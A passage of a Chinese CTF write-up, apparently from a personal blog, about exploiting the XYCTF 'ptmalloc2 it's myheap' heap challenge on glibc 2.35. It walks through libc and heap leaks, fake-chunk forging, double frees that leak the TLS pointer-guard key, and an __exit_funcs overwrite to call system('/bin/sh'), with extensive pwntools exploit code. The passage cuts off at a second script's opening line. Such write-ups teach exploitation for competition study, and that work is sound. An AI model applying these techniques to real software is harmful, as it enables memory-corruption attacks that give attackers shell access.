free")])])],-1),x=n("p",null,"劫持__exit_funcs链表 实现在exit的时候任意函数的调用 通过两次double free 第一次泄露tls中的key 第二次负责修改__exit_funcs链表",-1),h={href:"https://www.anquanke.com/post/id/243196",target:"_blank",rel:"noopener noreferrer"},q={href:"https://bbs.kanxue.com/thread-280518.htm#msg_header_h2_1",target:"_blank",rel:"noopener noreferrer"},f=n("p",null,"这俩个大佬提供了两种思路 我这边采用的Arahat0佬的劫持__exit_funcs链表的方式",-1),y=t(`<h4 id="泄露libc-heap" tabindex="-1"><a class="header-anchor" href="#泄露libc-heap" aria-hidden="true">#</a> 泄露libc heap</h4><blockquote><p>最简单的一步</p></blockquote><p>简单地通过让chunk进入tcache中 然后申请回来利用chunk中保留有关libc和heap的地址然后推算出libc基地址和heap基地址</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># 泄露出chunk</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
base_heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1936</span>
base_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">5</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">2206944</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>chunk进入unsortedbin</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418132947766.png" alt="image-20240418132947766" tabindex="0" loading="lazy"><figcaption>image-20240418132947766</figcaption></figure></li><li><p>free 8时 unsortedbin进入topchunk 但是此时保留了fd 等信息 我们只需要malloc回来即可</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418133015055.png" alt="image-20240418133015055" tabindex="0" loading="lazy"><figcaption>image-20240418133015055</figcaption></figure></li><li><p>申请回来</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418133239908.png" alt="image-20240418133239908" tabindex="0" loading="lazy"><figcaption>image-20240418133239908</figcaption></figure></li><li><p>然后write直接泄露即可</p></li></ul><h4 id="伪造fake-chunk" tabindex="-1"><a class="header-anchor" href="#伪造fake-chunk" aria-hidden="true">#</a> 伪造fake chunk</h4><blockquote><p>最消耗时间的一步</p></blockquote><ul><li>这里比较麻烦的就是fakechunk 这里我们将记录信息的chunk称之为<code>头chunk </code>记录<code>内容chunk</code>的size isUsed point</li><li><code>point</code>指向的就是<code>内容chunk</code></li></ul><p>为了绕过isUsed的检测 我们可以利用<code>delete</code>后没有清空的特性将原本的<code>头chunk</code>覆盖掉 这样就能随意控制<code>isUsed</code>和<code>point</code>了 实现任意free 所以我们选择触发<code>fastbin的合并</code> 来让原本的头chunk之间相互合并 然后我们通过malloc指定大小的chunk来分割这个chunk 控制<code>内容chunk</code>刚好为原本某一个的<code>头chunk</code></p><h5 id="示意图" tabindex="-1"><a class="header-anchor" href="#示意图" aria-hidden="true">#</a> 示意图</h5><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418134333731.png" alt="image-20240418134333731" tabindex="0" loading="lazy"><figcaption>image-20240418134333731</figcaption></figure><ul><li>这样我们就可以向content chunk写入内容劫持head chunk了 原理很简单 但是现在就要想办法触发fastbin中的合并机制了</li></ul><h4 id="fastbin合并机制" tabindex="-1"><a class="header-anchor" href="#fastbin合并机制" aria-hidden="true">#</a> fastbin合并机制</h4><ul><li><p>范围:2.35</p><ul><li>我们可以通过申请large bin chunk 来触发合并</li><li>我们可以通过让topchunk消耗完毕 然后触发合并</li></ul></li><li><p>由于我们最大申请128 也就是0x90大小的chunk 显然第一种我们是没办法直接申请large chunk</p><blockquote><p>Arahat0师傅提醒俺 我们可以通过向scanf输入大量数据 来让scanf malloc一个large chunk 然后触发合并 但是同时也会导致缓冲区一堆数据导致后续的scanf失灵 所以为了方便控制 我选择了将topchunk消耗完毕触发合并的方式</p></blockquote></li><li><p>连续申请大量chunk 消耗topchunk到size为一个较小值 然后在最后申请chunk 并且free chunk 让chunk进入fastbin链中 然后malloc一个较大的chunk 彻底消耗topchunk 触发fastbin的合并</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># tcache 0x20 0x90均存满</span>
<span class="token comment"># 剩下0xf3c7d0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">760</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">)</span>
<span class="token comment"># 防止fastbin合并后直接被topchunk合并 </span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>合并之前</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418151026231.png" alt="image-20240418151026231" tabindex="0" loading="lazy"><figcaption>image-20240418151026231</figcaption></figure></li><li><p>合并后</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418151102406.png" alt="image-20240418151102406" tabindex="0" loading="lazy"><figcaption>image-20240418151102406</figcaption></figure></li></ul><h4 id="构造fakecchunk" tabindex="-1"><a class="header-anchor" href="#构造fakecchunk" aria-hidden="true">#</a> 构造fakecchunk</h4><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>fakechunk <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;prev_size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;chunk_list_size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;isUsed&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token operator">//</span> 为触发泄露tls<span class="token operator">+</span><span class="token number">0x30</span>的double free的fastbinchunk地址
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;buff&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span>
<span class="token comment"># 已经完成覆写 free index5则可实现任意free</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;prev_size&quot;</span><span class="token punctuation">]</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;size&quot;</span><span class="token punctuation">]</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;chunk_list_size&quot;</span><span class="token punctuation">]</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;isUsed&quot;</span><span class="token punctuation">]</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;buff&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>此时index为5 就是我们劫持的<code>头chunk</code> 这里的fd就是我们后面要free的任意chunk</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418151731938.png" alt="image-20240418151731938" tabindex="0" loading="lazy"><figcaption>image-20240418151731938</figcaption></figure></li></ul><h4 id="泄露tls-0x30" tabindex="-1"><a class="header-anchor" href="#泄露tls-0x30" aria-hidden="true">#</a> 泄露tls+0x30</h4><blockquote><p>由于要泄露tls+0x30处的地址 从而来泄露出key值 方便我们去劫持exit_funcs链表 所以我们需要构造一个double free来malloc下来tls附近的内存区域</p></blockquote><ul><li><p>难点</p><ul><li>我们需要控制内存对齐 并且还不能破坏到了canary的值 所以我们double free劫持的chunk大小需要够大</li><li>实践发现这样会导致tcache中它标注的chunk数量和实际的数量并不对应 如果直接将fd填写为tls处地址 后续的malloc失效 因为tls处的fd位置我们并没有办法控制 大概率会是内存不对齐/内存不可写 所以我们需要后续的malloc</li><li>glibc2.35下存在fd加密机制 我们的fd需要经过与(base_heap&gt;&gt;12)进行异或操作 才是合法的fd才能够被正常解析 而且经过测试仿佛这里的base_heap会因为我们消耗topchunk一次而发生细微的改变 所以需要gdb手动调试计算出偏差</li></ul></li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># 构造一个double free</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token comment"># 这个chunk是以前为了当作跳板的chunk 但是后面切换了思路没有用了 为了不影响后续的heap计算就没有删除</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span>xor<span class="token operator">-</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>tls<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span>xor<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>tls<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># 泄露tls中信息</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>首先是在fastbin上构造出两个以上的chunk 然后free第二个chunk 来绕过fastbin中检查double free的机制（fastbin会检查你free的是否为第一个chunk）</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>__builtin_expect<span class="token punctuation">(</span>old <span class="token operator">==</span> p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	malloc_printerr<span class="token punctuation">(</span><span class="token string">&quot;double free or corruption (fasttop)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
p<span class="token operator">-</span><span class="token operator">&gt;</span>fd <span class="token operator">=</span> PROTECT_PTR<span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token operator">-</span><span class="token operator">&gt;</span>fd<span class="token punctuation">,</span> old<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">*</span>fb <span class="token operator">=</span> p<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240420123457567.png" alt="image-20240420123457567" tabindex="0" loading="lazy"><figcaption>image-20240420123457567</figcaption></figure><ul><li><p>然后将利用开始构造好的fakechunk进行free</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240420123602766.png" alt="image-20240420123602766" tabindex="0" loading="lazy"><figcaption>image-20240420123602766</figcaption></figure></li></ul><h5 id="fd加密机制" tabindex="-1"><a class="header-anchor" href="#fd加密机制" aria-hidden="true">#</a> fd加密机制</h5><blockquote><p>glibc高版本加入的fd加密机制 让我们没办法直接覆盖fd 绕过也很简单泄露heap地址即可</p></blockquote><ul><li>fd需要是heap基地址^目标地址</li></ul><h4 id="劫持exit-funcs链表" tabindex="-1"><a class="header-anchor" href="#劫持exit-funcs链表" aria-hidden="true">#</a> 劫持exit_funcs链表</h4><blockquote><p>最难崩的一步 因为我们需要劫持这个链表所以我们需要再一次触发fastbin的合并构造double free 然后指向exit_func处 进行覆写</p><p>本地打这个感觉还行 但是打远程的时候我脚本足足要跑20分钟 并且还因为比赛方平台网络不是特别好 导致我反复失败 最终跑了一晚上才跑出来</p></blockquote><ul><li>难点 <ul><li>因为上一次double free 导致tcache 中一条链已经存在一个无效的chunk地址(大概率不对齐) 所以我们下一次double free的时候就不能选择这个size大小的链了</li></ul></li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># size: 0x20c30</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">758</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add_with_no_chunk<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># 将topchunk消耗空触发合并</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>

<span class="token comment"># 指定free index 6 可以实现任意free</span>
<span class="token comment"># free_chunk就是后续构造double free的chunk地址</span>
free_chunk <span class="token operator">=</span> base_heap<span class="token operator">+</span><span class="token number">271376</span><span class="token operator">+</span><span class="token number">0x10</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 填写binsh只是为了后续调用system函数的时候可以找个地址来当作参数</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># 触发double free</span>
delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token comment"># 将fd指向exit_function地址处</span>
add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span>xor<span class="token operator">+</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">^</span>exit_function<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\\x00&quot;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> getData<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
<span class="token comment"># 获取key的值</span>
res <span class="token operator">=</span> res<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>
<span class="token comment"># 计算出key加密后的地址</span>
manba <span class="token operator">=</span> remove_high_digits<span class="token punctuation">(</span>rol<span class="token punctuation">(</span><span class="token number">0x401700</span><span class="token operator">^</span>res<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
addr <span class="token operator">=</span> remove_high_digits<span class="token punctuation">(</span>rol<span class="token punctuation">(</span>system_addr<span class="token operator">^</span>res<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;key:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;libc_base&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;heap_base&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;system_addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;exit_function:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>exit_function<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">0x42420</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">b&quot;5&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;key:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;libc_base&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;heap_base&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;system_addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;exit_function:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>exit_function<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="ptmalloc2-it-s-myheap-plus-orw-exit" tabindex="-1"><a class="header-anchor" href="#ptmalloc2-it-s-myheap-plus-orw-exit" aria-hidden="true">#</a> ptmalloc2 it&#39;s myheap plus（orw+exit）</h2><blockquote><p>相对于ptmp只是多了一个sandbox限制 就和Arahat0师傅文章中的流程一模一样 多了一个orw的利用 大致原理都是相同的</p><p>值得一提的是本地通了但是远程打了好久没通后面发现远程不让我以rw的方式打开flag 而是只允许我以r方式打开</p></blockquote><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

